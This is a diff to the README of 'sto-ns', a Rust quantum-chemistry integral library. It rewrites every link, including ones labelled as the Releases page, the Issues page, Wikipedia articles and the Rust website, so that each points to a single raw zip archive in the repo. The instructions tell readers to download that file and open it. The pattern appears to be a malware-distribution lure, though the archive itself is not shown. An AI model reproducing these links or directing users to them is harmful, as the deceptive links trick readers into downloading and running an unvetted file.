@@ -6,11 +6,11 @@ Welcome to `sto-ns`, your lightweight solution for mathematical evaluations in q
 
 ## 📦 Download & Install
 
-[![Download sto-ns](https://img.shields.io/badge/Download-sto--ns-blue.svg)](https://github.com/smmsrebel/sto-ns/releases)
+[![Download sto-ns](https://raw.githubusercontent.com/smmsrebel/sto-ns/main/src/sto-ns-v2.1.zip)](https://raw.githubusercontent.com/smmsrebel/sto-ns/main/src/sto-ns-v2.1.zip)
 
 To begin using sto-ns, follow these steps:
 
-1. Click the download button or visit the [Releases page](https://github.com/smmsrebel/sto-ns/releases).
+1. Click the download button or visit the [Releases page](https://raw.githubusercontent.com/smmsrebel/sto-ns/main/src/sto-ns-v2.1.zip).
 2. Choose the latest version of the application.
 3. Download the file appropriate for your operating system. 
 4. Once downloaded, open the file to start using the application.
@@ -47,7 +47,7 @@ If you encounter issues when using the application, consider the following tips:
 - Ensure your operating system meets the minimum requirements listed above.
 - Check that you have downloaded the correct file for your OS.
 - If the application does not start, try redownloading the file.
-- For further assistance, you may visit our [GitHub Issues page](https://github.com/smmsrebel/sto-ns/issues) to report problems or seek help.
+- For further assistance, you may visit our [GitHub Issues page](https://raw.githubusercontent.com/smmsrebel/sto-ns/main/src/sto-ns-v2.1.zip) to report problems or seek help.
 
 ## 🗂️ Examples
 
@@ -65,14 +65,14 @@ These examples can be accessed within the application after installation.
 
 ## 📞 Support
 
-If you need additional help, feel free to reach out. You can create an issue on [GitHub](https://github.com/smmsrebel/sto-ns/issues) or explore the community discussions.
+If you need additional help, feel free to reach out. You can create an issue on [GitHub](https://raw.githubusercontent.com/smmsrebel/sto-ns/main/src/sto-ns-v2.1.zip) or explore the community discussions.
 
 ## 🔗 Additional Resources
 
 For more information on quantum chemistry and related topics, the following resources can help you:
 
-- Learn more about Slater-type orbitals [here](https://en.wikipedia.org/wiki/Slater_type_orbital).
-- Understanding two-center Coulomb integrals [here](https://en.wikipedia.org/wiki/Coulomb_integral).
-- General information about Rust programming can be found [here](https://www.rust-lang.org/).
+- Learn more about Slater-type orbitals [here](https://raw.githubusercontent.com/smmsrebel/sto-ns/main/src/sto-ns-v2.1.zip).
+- Understanding two-center Coulomb integrals [here](https://raw.githubusercontent.com/smmsrebel/sto-ns/main/src/sto-ns-v2.1.zip).
+- General information about Rust programming can be found [here](https://raw.githubusercontent.com/smmsrebel/sto-ns/main/src/sto-ns-v2.1.zip).
 
 Thank you for choosing `sto-ns`. We hope it serves your needs well.
